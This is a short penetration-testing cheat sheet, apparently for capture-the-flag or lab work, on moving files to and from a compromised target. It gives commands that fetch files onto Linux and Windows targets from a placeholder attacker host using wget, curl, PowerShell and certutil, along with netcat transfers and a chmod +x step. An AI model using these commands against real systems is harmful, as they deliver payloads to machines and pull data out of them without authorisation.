# 📦 File Transfer Cheat Sheet

## Python HTTP Server

On attacker:

```bash
python3 -m http.server 8000
```

Linux target:

```bash
wget http://<ATTACKER_IP>:8000/<FILE>
curl -O http://<ATTACKER_IP>:8000/<FILE>
```

Windows target:

```powershell
Invoke-WebRequest http://<ATTACKER_IP>:8000/<FILE> -OutFile <FILE>
```

or:

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/<FILE> <FILE>
```

## SCP

```bash
scp <FILE> <USER>@<TARGET_IP>:/tmp/
scp <USER>@<TARGET_IP>:/path/to/file .
```

## Netcat

Receiver:

```bash
nc -lvnp 9001 > file.bin
```

Sender:

```bash
nc <RECEIVER_IP> 9001 < file.bin
```

## Base64 Small Files

Encode:

```bash
base64 -w 0 file.bin
```

Decode:

```bash
echo '<BASE64>' | base64 -d > file.bin
```

PowerShell decode:

```powershell
[IO.File]::WriteAllBytes('file.bin',[Convert]::FromBase64String('<BASE64>'))
```

## Quick Choice

```text
HTTP available? → Python server + wget/curl/IWR
SSH creds? → SCP
Only raw TCP? → Netcat
Tiny file / awkward channel? → Base64
```

## After Transfer

```bash
chmod +x <FILE>
file <FILE>
sha256sum <FILE>
```

Only transfer tooling permitted by the competition or lab rules.
